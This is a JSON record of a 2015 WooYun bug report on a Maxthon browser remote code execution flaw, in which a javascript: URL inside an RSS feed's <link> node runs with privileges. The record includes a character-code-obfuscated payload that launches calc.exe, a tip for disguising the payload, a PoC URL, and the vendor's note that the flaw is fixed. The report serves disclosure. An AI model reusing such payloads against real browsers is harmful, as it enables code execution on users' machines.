{"id": 9224, "wybug_id": "wooyun-2015-0112901", "wybug_title": "傲游浏览器猥琐技巧的远程代码执行", "wybug_corp": "傲游", "wybug_author": "梧桐雨", "wybug_date": "2015-05-08 17:04", "wybug_open_date": "2015-08-06 17:18", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-06：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： RT! 详细说明：  傲游浏览器现阶段挺安全的了，除了之前的点击，没出过什么命令执行，但是这次还是被我找到一处比较容易触发的地方。傲游浏览器如果匹配到当前的url结尾是xml，则会自动解析为如下的页面：\n\n订阅相关此处已经出过一个命令执行：http://wooyun.org/bugs/wooyun-2010-082227在测试的时候，意外发现傲游浏览器竟然会将<link></link>节点的信息当作url解析。如果我们传入一个javascript:alert(location.href)呢？即：<link>javascript:alert(location.href)</link>不难看到，得到的是特权域：\n\n将上面js部分修改为：javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,115,46,115,114,99,61,34,109,120,58,47,47,114,101,115,47,110,111,116,105,102,105,99,97,116,105,111,110,47,34,59,115,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,115,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,109,97,120,116,104,111,110,46,112,114,111,103,114,97,109,46,80,114,111,103,114,97,109,46,108,97,117,110,99,104,40,34,67,58,47,119,105,110,100,111,119,115,47,115,121,115,116,101,109,51,50,47,99,97,108,99,46,101,120,101,34,44,34,34,41,125,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))执行之后：\n\n这里很多人会说，你这样都不够隐蔽，谁会去点呢？还可以这样：javascript:/*注释*/执行代码\n\n   漏洞证明：  访问：http://wutongyu.info/if.xml点击下图的任意一个位置，即可执行代码\n\n   修复方案：  修复此处<link></link>允许定义javascript伪协议执行代码。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-08 17:16 厂商回复： 多谢反馈, 继续加过滤 最新状态： 2015-06-16：4.4.5.2000 已修复  ", "replys": "漏洞评价：\n评论\n     2015-05-08 17:06 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @疯狗 我不会放过你的 把我标题改成这样    \n     2015-05-08 17:10 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  坐等狗哥前来    \n     2015-05-08 17:24 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @梧桐雨 这标签都能执行，确实够那啥...    \n     2015-05-08 17:27 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @felixk3y 你能看到细节？    \n     2015-05-08 17:46 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  mark..    \n     2015-05-08 20:50 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  淫荡的技巧，我也想学浏览器安全啊啊啊    \n     2015-05-09 14:50 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  妹子，哥哥来迟了，这么多人    \n     2015-05-10 14:19 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @梧桐雨 你能看到细节？    \n     2015-05-10 14:19 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @felixk3y 发错 …… 是 你能看到细节？    \n     2015-05-12 09:53 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n   赞    \n     2015-05-14 19:44 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  rss订阅......好地方    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}